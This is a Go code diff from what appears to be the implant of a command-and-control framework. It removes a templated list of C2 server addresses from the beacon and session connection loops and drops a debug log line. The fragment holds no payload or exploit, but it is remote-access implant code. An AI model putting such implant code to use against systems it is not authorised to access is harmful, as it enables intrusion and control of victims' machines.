@@ -68,14 +68,7 @@ import (
 )
 
 var (
-	InstanceID string
-
-	c2Servers = []string{
-		// {{range $index, $value := .Config.C2}}
-		"{{$value}}", // {{$index}}
-		// {{end}}
-	}
-
+	InstanceID       string
 	connectionErrors = 0
 )
 
@@ -203,7 +196,7 @@ func beaconStartup() {
 	defer func() {
 		abort <- struct{}{}
 	}()
-	beacons := transports.StartBeaconLoop(c2Servers, abort)
+	beacons := transports.StartBeaconLoop(abort)
 	for beacon := range beacons {
 		// {{if .Config.Debug}}
 		log.Printf("Next beacon = %v", beacon)
@@ -235,7 +228,7 @@ func sessionStartup() {
 	defer func() {
 		abort <- struct{}{}
 	}()
-	connections := transports.StartConnectionLoop(c2Servers, abort)
+	connections := transports.StartConnectionLoop(abort)
 	for connection := range connections {
 		if connection != nil {
 			err := sessionMainLoop(connection)
@@ -482,9 +475,7 @@ func openSessionHandler(data []byte) {
 		log.Printf("[beacon] failed to parse open session msg: %s", err)
 		// {{end}}
 	}
-	// {{if .Config.Debug}}
-	log.Printf("[beacon] open session -> %v", openSession.C2S)
-	// {{end}}
+
 	if openSession.Delay != 0 {
 		// {{if .Config.Debug}}
 		log.Printf("[beacon] delay %s", time.Duration(openSession.Delay))
@@ -494,7 +485,7 @@ func openSessionHandler(data []byte) {
 
 	go func() {
 		abort := make(chan struct{})
-		connections := transports.StartConnectionLoop(openSession.C2S, abort)
+		connections := transports.StartConnectionLoop(abort)
 		defer func() { abort <- struct{}{} }()
 		connectionAttempts := 0
 		for connection := range connections {
